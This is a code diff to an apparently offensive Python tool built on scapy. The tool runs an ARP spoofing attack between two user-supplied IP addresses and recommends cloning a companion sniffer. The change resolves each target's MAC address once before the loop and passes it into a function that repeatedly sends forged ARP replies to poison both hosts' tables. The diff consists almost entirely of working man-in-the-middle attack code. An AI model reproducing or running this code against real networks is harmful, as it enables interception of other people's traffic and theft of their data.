@@ -406,15 +406,17 @@ def arpspoof():
     iptw = input("[Required] --> The second target's IP: ")
     print("\n[Recommended] --> Clone the XEye-sn sniffer tool through this link \"https://github.com/Engmostafa26/XEye-sn.git\" \n")
     time.sleep(1)
+    mact = getm(ipo)
+    mactt = getm(iptw)
     integ = 4
     print("[Info] --> ARP Spoofing attack is started ....")
     time.sleep(1)
     print("[Instruction] --> To stop the attack and restore all the targets ARP tables, press on the left \"ctrl+c\" once or more if needed")
     #try:
     while True:
-        spoofing(ipo, iptw)
+        spoofing(ipo, iptw, mact)
         time.sleep(1)
-        spoofing(iptw, ipo)
+        spoofing(iptw, ipo, mactt)
         print("\r ARP Spoofing packets sent: "+str(integ), end="")
         integ += 4
         time.sleep(1)
@@ -437,10 +439,10 @@ def getm(ip):
     comb = targeth/targetn
     anss = sc.srp(comb,verbose=False,timeout=3)[0]
     return anss[0][1].hwsrc
-def spoofing(ipt, ips):
-    mact = getm(ipt)
-    print(mact)
-    spacket = sc.ARP(op=2,pdst=ipt,psrc=ips,hwdst=mact)
+def spoofing(ipt, ips, macc):
+    #mact = getm(ipt)
+    #print(mact)
+    spacket = sc.ARP(op=2,pdst=ipt,psrc=ips,hwdst=macc)
     sc.send(spacket,count=2,verbose=False)
 
 def invalid():
